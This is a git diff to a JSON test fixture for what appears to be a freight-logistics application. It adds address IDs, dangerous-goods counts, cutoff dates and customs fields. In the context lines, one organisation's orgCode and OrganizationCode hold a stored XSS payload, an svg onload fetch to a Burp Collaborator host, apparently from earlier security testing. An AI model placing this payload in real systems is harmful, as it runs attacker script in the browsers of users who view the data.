@@ -321,6 +321,8 @@
     "updatedAt": "2024-02-12T04:36:09",
     "customerCategory": "CATEGORY_5",
     "shipmentCount": 0,
+    "dgPacksCount": 40,
+    "dgPacksUnit": "Packages",
     "isShipmentReadOnly": false
   },
   "HAWB": {
@@ -1707,6 +1709,7 @@
       "orgCode": "LL_QR_25300",
       "tenantId": 166,
       "addressCode": "Def RA Address",
+      "addressId": "12",
       "orgData": {
         "Id": 25300,
         "City": "agra",
@@ -1744,6 +1747,7 @@
       "orgCode": "22481_1",
       "tenantId": 166,
       "addressCode": "Default",
+      "addressId": "14",
       "orgData": {
         "Id": 23632,
         "City": "Cairo",
@@ -2098,6 +2102,7 @@
         "orgCode": "HARSH_TEST",
         "tenantId": 166,
         "addressCode": "SHORT",
+        "addressId": "18",
         "orgData": {
           "Receivables": false,
           "Email": "contact@godship.com",
@@ -2188,6 +2193,7 @@
       "id": 1,
       "orgCode": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`>",
       "addressCode": "Default",
+      "addressId": "20",
       "orgData": {
         "Id": 4114,
         "OrganizationCode": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`>",
@@ -2229,6 +2235,7 @@
       "id": 1,
       "orgCode": "22481_1",
       "addressCode": "VALID",
+      "addressId": "12",
       "orgData": {
         "Id": 58,
         "OrganizationCode": "000043",
@@ -2268,6 +2275,7 @@
       "id": 1,
       "orgCode": "223532_4",
       "addressCode": "Default1",
+      "addressId": "15",
       "orgData": {
         "Id": 64,
         "OrganizationCode": "00001",
@@ -2328,6 +2336,7 @@
           "addressCode": null
         },
         "notifyParty": {
+          "addressId": "18",
           "orgCode": {
             "Id": 12310,
             "OrganizationCode": "{FirstName:3}{Sequence:9}12310",
@@ -3171,6 +3180,32 @@
     "route": "",
     "sourceTenantId": 13497,
     "intraBranch": false,
+    "originBranch": 100,
+    "controlled": true,
+    "controlledReferenceNumber": "abc",
+    "incotermsLocation": "INC",
+    "partner": "Partner",
+    "coLoadCarrierName": "coLoadCarrierName",
+    "coLoadBkgNumber": "coLoadBkgNumber",
+    "coLoadBlNumber": "coLoadBlNumber",
+    "bookingAgent": 12,
+    "pickupAtOrigin": 11,
+    "deliveryAtDestination": 13,
+    "brokerageAtOrigin": 14,
+    "brokerageAtDestination": 15,
+    "terminalCutoff": "2024-04-30T14:22:00",
+    "verifiedGrossMassCutoff": "2024-04-30T14:22:00",
+    "shippingInstructionCutoff": "2024-04-30T14:22:00",
+    "earliestEmptyEquipmentPickUp": "2024-04-30T14:22:00",
+    "latestFullEquipmentDeliveredToCarrier": "2024-04-30T14:22:00",
+    "earliestDropOffFullEquipmentToCarrier": "2024-04-30T14:22:00",
+    "isReefer": false,
+    "latestArrivalTime": "2024-04-30T14:22:00",
+    "triangulationPartnerList": [
+      {
+        "triangulationPartner": 300
+      }
+    ],
     "client": {
       "id": 2492614,
       "guid": "c6c4045a-9b4e-4f31-908f-4a0dcf109a70",
@@ -3298,6 +3333,12 @@
       "releaseType": "BSD",
       "houseBillType": "DHK",
       "onBoard": "LDN",
+      "BOENumber": "BOENumber",
+      "BOEDate": "2024-04-08 00:00:00",
+      "ownership" : "Self",
+      "ownershipName": "ownershipName",
+      "passedBy": "Self",
+      "passedByPerson": "passedByPerson",
       "onBoardDate": "2024-04-08 00:00:00",
       "original": 2,
       "copy": 2,
